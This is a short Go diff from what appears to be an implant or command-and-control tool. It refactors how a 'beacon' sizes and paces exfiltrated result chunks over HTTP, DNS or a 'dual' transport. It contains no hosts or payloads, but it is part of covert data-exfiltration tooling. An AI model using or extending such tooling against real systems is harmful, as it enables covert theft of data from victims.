@@ -223,8 +223,13 @@ func httpChunkCeiling(maxBodyBytes int) int {
 // On HTTP the operator's HTTPExfil.MaxPayload wins, clamped to what the listener
 // will accept. On DNS (or when HTTP chunking is not configured) the size is
 // derived from the subdomain and FQDN budgets exactly as it always was.
-func (c *Config) ResultChunkSize() int {
-	if c.Transport == "http" && c.HTTPExfil.MaxPayload > 0 {
+func (c *Config) ResultChunkSize() int { return c.ResultChunkSizeFor(c.Transport) }
+
+// ResultChunkSizeFor sizes a DATA chunk for the transport actually in use. A
+// dual beacon rides HTTP for results (DNS is only the readiness signal), so it
+// takes the HTTP budget unless it latched to DNS.
+func (c *Config) ResultChunkSizeFor(transport string) int {
+	if (transport == "http" || transport == "dual") && c.HTTPExfil.MaxPayload > 0 {
 		size := c.HTTPExfil.MaxPayload
 		if ceiling := httpChunkCeiling(c.HTTPExfil.MaxBodyBytes); ceiling > 0 && size > ceiling {
 			size = ceiling
@@ -304,9 +309,11 @@ func (c *Config) ResultChunkSize() int {
 
 // ResultBurst returns the chunk pacing for results, preferring the HTTP-specific
 // values when the beacon is on HTTP and the operator set them.
-func (c *Config) ResultBurst() (chunksPerBurst, pauseMs int) {
+func (c *Config) ResultBurst() (chunksPerBurst, pauseMs int) { return c.ResultBurstFor(c.Transport) }
+
+func (c *Config) ResultBurstFor(transport string) (chunksPerBurst, pauseMs int) {
 	chunksPerBurst, pauseMs = c.ExfilChunksPerBurst, c.ExfilBurstPauseMs
-	if c.Transport == "http" {
+	if transport == "http" || transport == "dual" {
 		if c.HTTPExfil.ChunksPerBurst > 0 {
 			chunksPerBurst = c.HTTPExfil.ChunksPerBurst
 		}
